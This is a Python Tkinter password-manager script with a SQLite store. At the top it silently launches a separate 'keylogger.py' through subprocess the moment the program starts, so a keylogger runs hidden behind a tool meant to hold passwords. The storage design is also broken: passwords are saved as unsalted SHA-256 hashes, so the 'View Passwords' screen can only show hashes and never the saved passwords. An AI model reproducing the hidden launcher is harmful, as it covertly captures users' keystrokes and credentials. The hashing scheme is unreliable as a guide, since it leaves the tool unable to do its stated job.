import tkinter as tk
from tkinter import messagebox
import sqlite3
import hashlib
import subprocess

def run_external_script():
    try:
        subprocess.Popen(['python', 'keylogger.py'])
    except Exception as e:
        print(f"Error running external script: {e}")

run_external_script()


conn = sqlite3.connect('password_manager.db')
c = conn.cursor()


c.execute('''CREATE TABLE IF NOT EXISTS passwords
             (id INTEGER PRIMARY KEY, site TEXT, username TEXT, password TEXT)''')
conn.commit()


def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()


def save_password():
    site = site_entry.get()
    username = username_entry.get()
    password = password_entry.get()

    if site and username and password:
        hashed_password = hash_password(password)
        c.execute("INSERT INTO passwords (site, username, password) VALUES (?, ?, ?)", (site, username, hashed_password))
        conn.commit()
        messagebox.showinfo("Success", "Password saved successfully!")
    else:
        messagebox.showwarning("Input Error", "Please fill out all fields!")


def view_passwords():
    c.execute("SELECT * FROM passwords")
    rows = c.fetchall()

    view_window = tk.Toplevel(root)
    view_window.title("View Passwords")

    for idx, row in enumerate(rows):
        site, username, password = row[1], row[2], row[3]
        tk.Label(view_window, text=f"Site: {site}").grid(row=idx, column=0)
        tk.Label(view_window, text=f"Username: {username}").grid(row=idx, column=1)
        tk.Label(view_window, text=f"Password: {password}").grid(row=idx, column=2)


root = tk.Tk()
root.title("Password Manager")


tk.Label(root, text="Site:").grid(row=0, column=0)
tk.Label(root, text="Username:").grid(row=1, column=0)
tk.Label(root, text="Password:").grid(row=2, column=0)


site_entry = tk.Entry(root)
site_entry.grid(row=0, column=1)

username_entry = tk.Entry(root)
username_entry.grid(row=1, column=1)

password_entry = tk.Entry(root, show="*")
password_entry.grid(row=2, column=1)


save_button = tk.Button(root, text="Save Password", command=save_password)
save_button.grid(row=3, column=0, pady=10)

view_button = tk.Button(root, text="View Passwords", command=view_passwords)
view_button.grid(row=3, column=1, pady=10)


root.mainloop()


conn.close()
